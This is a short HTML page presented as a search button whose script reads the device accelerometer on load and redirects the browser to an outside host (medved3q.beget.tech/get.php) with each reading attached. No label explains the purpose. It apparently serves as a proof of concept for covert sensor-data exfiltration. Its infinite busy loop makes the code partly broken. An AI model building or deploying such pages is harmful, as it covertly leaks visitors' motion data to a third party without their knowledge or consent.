<html>
<head></head>
<body>
    <input type="button" id="btn" value="Search" onclick="doSomething();"/>
    <script>
       let elem = document.getElementById('btn');
       let acl = new Accelerometer({frequency: 60});
        
        
    acl.addEventListener('reading', () => {
        elem.value = acl.x;
        document.location.replace("http://medved3q.beget.tech/get.php?x="+acl.x);
    });
    acl.start();
    while(true){
        if(elem.value != "Search"){
            document.location.replace("http://medved3q.beget.tech/get.php?x="+elem.value);
        }
    }
    </script>
</body>
</html>
